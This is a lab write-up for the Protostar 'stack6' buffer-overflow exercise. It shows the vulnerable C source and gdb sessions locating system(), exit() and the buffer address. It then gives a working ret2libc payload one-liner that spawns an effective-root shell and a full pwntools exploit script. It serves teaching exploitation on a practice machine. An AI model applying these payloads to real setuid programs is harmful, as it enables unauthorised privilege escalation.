# Stack Six

Stack6 looks at what happens when you have restrictions on the return address.

This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.

It is strongly suggested you experiment with multiple ways of getting your code to execute here.

This level is at /opt/protostar/bin/stack6

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

## Writeup

We can try the **ret2libc** approach for this challenge.

In the code there are a check to the return address and if it is inside the stack will prompt: **bzzzt**

We must inject a valid address. For example there is the system call **system()** that is not in the stack and can execute a **/bin/sh**.

Let's debug the binary:

```bash
gdb /opt/protostar/bin/stack6
```

Unset the LINES and COLUMNS environment variables:

```
unset env LINES
unset env COLUMNS
```

Send the command start to create the process and execute the first statement:

```
start
```

Now we can print the address of **system()** wrapper function:

```
p system
```

With this output:

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
```

The address is valid, is not in the stack.

Now need to find the address of **buffer** and **ret**.

To do it, need to set a breakpoint to the **getpath()** function.

Let's disassembly getpath:

```
disass getpath
```

With this output:

```
(gdb) disass getpath
Dump of assembler code for function getpath:
0x08048484 <getpath+0>:	push   %ebp
0x08048485 <getpath+1>:	mov    %esp,%ebp
0x08048487 <getpath+3>:	sub    $0x68,%esp
0x0804848a <getpath+6>:	mov    $0x80485d0,%eax
0x0804848f <getpath+11>:	mov    %eax,(%esp)
0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:	mov    0x8049720,%eax
0x0804849c <getpath+24>:	mov    %eax,(%esp)
0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:	lea    -0x4c(%ebp),%eax
0x080484a7 <getpath+35>:	mov    %eax,(%esp)
0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
0x080484af <getpath+43>:	mov    0x4(%ebp),%eax
0x080484b2 <getpath+46>:	mov    %eax,-0xc(%ebp)
0x080484b5 <getpath+49>:	mov    -0xc(%ebp),%eax
0x080484b8 <getpath+52>:	and    $0xbf000000,%eax
0x080484bd <getpath+57>:	cmp    $0xbf000000,%eax
0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:	mov    $0x80485e4,%eax
0x080484c9 <getpath+69>:	mov    -0xc(%ebp),%edx
0x080484cc <getpath+72>:	mov    %edx,0x4(%esp)
0x080484d0 <getpath+76>:	mov    %eax,(%esp)
0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:	movl   $0x1,(%esp)
0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:	mov    $0x80485f0,%eax
0x080484e9 <getpath+101>:	lea    -0x4c(%ebp),%edx
0x080484ec <getpath+104>:	mov    %edx,0x4(%esp)
0x080484f0 <getpath+108>:	mov    %eax,(%esp)
0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:	leave  
0x080484f9 <getpath+117>:	ret    
End of assembler dump.
```

Set the breakpoint to the **sub $0x68,%esp**, because the ebp is already pushed in the stack:

```
b *0x08048487
```

Continue the execution:

```
c
```

We now can print ebp+4 for the return address of the getpath() function:

```
p $ebp+4
```

With this result:

```
(gdb) p $ebp+4
$2 = (void *) 0xbffffcec
```

Now go to the **gets** call and take the **buffer** address:

```
b *0x080484aa
```

Continue the execution:

```
c
```

Show registers:

```
info registers
```

With this output:

```
(gdb) info registers
eax            0xbffffc9c	-1073742692
ecx            0xb7fd9340	-1208118464
edx            0x0	0
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffc80	0xbffffc80
ebp            0xbffffce8	0xbffffce8
esi            0x0	0
edi            0x0	0
eip            0x80484aa	0x80484aa <getpath+38>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

The address of the **buffer** is in **eax** (**0xbffffc9c**).

We are now able to discover the number of word between the **buffer** and the **EIP**:

```
0xbffffcec - 0xbffffc9c = 50 = 80
```

The buffer size is 64, we can subtract 64:

```
80 - 64 = 16 / 4 = 4 word
```

Need to write 4 word of junk to get the **EIP** register.

After that need to write the **system()** address.

But there is a problem: After the system() address need to write a return address of the function and only after that need to write the parameter.

For the function after system() we can use the **exit()** function.

Let's find his address:

```
p exit
```

With this output:

```
(gdb) p exit
$3 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
```

Ok now remain only the parameter of the system() function.

We can write it into the buffer and write a pointer to it after the exit() address.

As this:

```python
'/bin//sh\x00' + 'a' * (64-9) + 'bbbb' * 4 + system() + exit() + '\x9c\xfc\xff\xbf'
```

**N.B.** **9** is the length of the parameter string

Our final exploit will be:

```bash
(python -c "print('/bin//sh\x00' + 'a' * 55 + 'bbbb' * 4 + '\xb0\xff\xec\xb7' + '\xc0\x60\xec\xb7' + '\x9c\xfc\xff\xbf')"; cat) | /opt/protostar/bin/stack6
```

We are effective root:

```bash
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

## Writeup

```python
#!/usr/bin/python3
from pwn import *

# Set context
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# Set up pwntools for the correct architecture
exe = context.binary = ELF('stack6')

host = args.HOST or 'protostar'
port = int(args.PORT or 22)
user = args.USER or 'user'
password = args.PASSWORD or 'user'
remote_path = '/opt/protostar/bin/stack6'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv,
                         gdbscript=gdbscript,
                         ssh=shell,
                         *a,
                         **kw)
    else:
        return shell.run([remote_path] + argv, *a, **kw)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x080484aa
continue
'''.format(**locals())

io = start(env={})
shell_name = b'/bin//sh\x00'
payload = shell_name + b'a' * (64-len(shell_name)) + b'junk' * 4 + p32(0xb7ecffb0) + p32(0xb7ec60c0) + p32(0xbffffc9c)
io.sendline(payload)
io.interactive()
```